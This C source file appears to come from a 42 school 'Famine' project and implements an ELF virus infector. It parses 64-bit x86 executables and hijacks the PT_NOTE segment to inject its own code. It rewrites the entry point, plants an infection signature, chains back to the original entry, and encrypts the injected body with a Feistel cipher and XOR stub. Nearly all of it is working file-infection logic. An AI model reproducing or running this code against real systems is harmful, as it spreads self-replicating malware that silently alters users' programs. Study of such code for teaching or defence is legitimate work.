/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
/*   Updated: 2024/11/25 15:31:57 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

static bool		parsing(byte *file, elf_data *data);

#define _START_SIZE 0x10e

void manual_modif(uint8_t *ptrace, uint8_t *ptrace_end, uint8_t *decrypt) {
    while (ptrace < ptrace_end) { // While current_ptrace < end_ptrace
        // uint32_t key = *(uint32_t *)ptrace;  // Read 4 bytes from _ptrace (key)
        uint32_t data = *(uint32_t *)decrypt; // Read 4 bytes from decrypt (encrypted data)
        *(uint32_t *)decrypt = data ^ 0xcacacaca;   // Decrypt using XOR and save the result
        ptrace += 4;                         // Advance by 4 bytes in _ptrace
        decrypt += 4;                        // Advance by 4 bytes in decrypt
    }
}



uint32_t generate_random_key() {
    int64_t fd;
	open(fd, "/dev/urandom", O_RDONLY);
    if (fd == -1) {
        return 0;
    }

	int64_t ret;
    uint32_t key = 0;
	read(ret, fd, &key, sizeof(key));
    if (ret != sizeof(key)) {
        close(fd);
        return 0;
    }

    close(fd);
    key = 0xbebecaca; // For testing purposes
    return key;
}

// Fonction de Feistel
uint32_t feistel_function(uint32_t half_block, uint32_t subkey) {
    return (half_block ^ subkey) + ((half_block << 3) | (half_block >> 29));
}

// Chiffrement d'un seul bloc
void feistel_encrypt_block(uint32_t *left, uint32_t *right, uint32_t key) {
    for (int round = 0; round < 8; round++) {
        uint32_t subkey = key ^ (round * 0x1234ABCD);
        uint32_t temp = *right;
        *right = *left ^ feistel_function(*right, subkey);
        *left = temp;
    }
}

// Chiffrement des données (en boucle sur les blocs complets uniquement)
void feistel_encrypt(uint8_t *data, size_t size, uint32_t key) {
    uint32_t left, right;

    // Chiffrer uniquement les blocs complets de taille BLOCK_SIZE
    size_t max_blocks = size / 8;
    for (size_t i = 0; i < max_blocks * 8; i += 8) {
        left = *(uint32_t *)(data + i);
        right = *(uint32_t *)(data + i + 4);

        feistel_encrypt_block(&left, &right, key);

        *(uint32_t *)(data + i) = left;
        *(uint32_t *)(data + i + 4) = right;
    }

    // Les octets restants (taille non divisible par BLOCK_SIZE) ne sont pas modifiés.
}


//	Infects the file located at path
//
//	Returns true on a critical error that needs to stop the whole infection program
bool	infect(profiling *this, const str path) {
	int64_t		fd = 0;
	int64_t		ret = 0;
	struct stat file_stat = {0};
	byte		*file_origin = NULL;
	elf_data	data;
	size_t		signature[5] = {
		0x6465746365666E49,
		0x6562646120796220,
		0x646E6120636D2D6E,
		0x6472616975676E20,
		0x00293B20
	};

	(void)fd;
	(void)ret;
	(void)this;

	open(fd, path, O_RDWR);
	if (fd < 0) {
		printf(FILE_LINE("open failed: %ld\n"), ret);
		return false;
	}

	fstat(ret, fd, &file_stat);
	if (ret) {
		printf(FILE_LINE("fstat failed: %ld\n"), ret);
	}

	if (file_stat.st_size < (long int)sizeof(Elf64_Ehdr))
		goto infect_end;

	mmap(file_origin, NULL, file_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (file_origin == MAP_FAILED) {
		printf(FILE_LINE("fstat failed: %p\n"), file_origin);
		return true;
	}

	data.original_size = file_stat.st_size;
	data.fd = fd;

	// Logic starts
	if (parsing(file_origin, &data) == false) {
		printf("%s is already infected or not compatible\n", path);
		goto infect_end;
	}

	//	Change the PT_NOTE segment
	change_note_segment(this, &data);

	print_data(&data);

	//	Copy the code
	ft_memcpy(data.file + data.infection_offset_file, this->start_rip, this->size);
	
	//	Change the entrypoint
	data.elf->e_entry = data.infection_offset_mem + this->size - _START_SIZE;

	write(ret, 1, &data.elf->e_entry, 4);

	printf("%lx + %lx - %x = %lx (%lx)\n", data.infection_offset_mem, this->size, _START_SIZE, data.elf->e_entry,
		data.infection_offset_mem + this->size - _START_SIZE);

	//	Copy signature
	ft_memcpy(data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET, (byte *)signature, 40);
	printf("Written %s at 0x%lx\n", data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET,
		data.infection_offset_file + this->size + SIGNATURE_OFFSET);

	int	new_jump = 0 - (data.infection_offset_mem + this->size) + data.original_entry_point_mem + 12;
	int zero = 0;

	// Write jump to original entry point and jump to decrypt if we aren't the original
	ft_memcpy(data.file + data.infection_offset_file + this->size - 16, (byte *)&new_jump, 4);
	ft_memcpy(data.file + data.infection_offset_file + this->size - 247, (byte *)&zero, 4);

	uint64_t key = generate_random_key();
	if (key == 0) {
		printf("Failed to generate a random key\n");
		goto infect_end;
	}

	// Write the key
	ft_memcpy(data.file + data.infection_offset_file + this->size - 139, (byte *)&key, 4);

	/* encrypt le code
		debut = data.file + data.infection_offset_file
		fin = data.file + data.infection_offset_file + this.size - _START_SIZE
	*/

	feistel_encrypt(data.file + data.infection_offset_file, this->size - _START_SIZE - 1, key);

	byte *ptrace_start = data.file + data.infection_offset_file + this->size - 190;
	byte *ptrace_end = data.file + data.infection_offset_file + this->size - 156;
	byte *decrypt_start = data.file + data.infection_offset_file + this->size - 155;

	// // write ptrace_start, ptrace_end, decrypt_start, i want the pointer so 0x... not the value
	// // write(ret, 1, ptrace_start, 8);
	// // write(ret, 1, ptrace_end, 8);
	// // write(ret, 1, decrypt_start, 8);


	manual_modif(ptrace_start, ptrace_end, decrypt_start);

	// Logic ends
	infect_end:
	munmap(ret, data.file, file_stat.st_size);
	close(fd);

	return false;
}

//	Check if the file is compatible for infection and parses the required data
//		in the elf_data *data argument
//
//	Returns true if it's compatible
//	Returns false if it's not
static bool	parsing(byte *file, elf_data *data) {
	Elf64_Phdr	*seg = NULL;

	if (((uint32_t *)file)[0] != 0x464c457f)
		return false;

	if (file[EI_CLASS] != ELFCLASS64 || file[EI_DATA] != ELFDATA2LSB)
		return false;

	if (((Elf64_Ehdr *)file)->e_machine != EM_X86_64 ||
			!(((Elf64_Ehdr *)file)->e_type == ET_EXEC || ((Elf64_Ehdr *)file)->e_type == ET_DYN))
		return false;

	data->file = file;
	data->elf = (Elf64_Ehdr *)file;
	data->sections = (Elf64_Shdr *)(file + data->elf->e_shoff);
	data->segments = (Elf64_Phdr *)(file + data->elf->e_phoff);
	data->original_entry_point_mem = data->elf->e_entry;

	for (size_t i = 0; i < data->elf->e_phnum; i++) {
		seg = &data->segments[i];

		if (seg->p_flags & PF_FAMINE) {
			return false;
		}
	}

	return true;
}

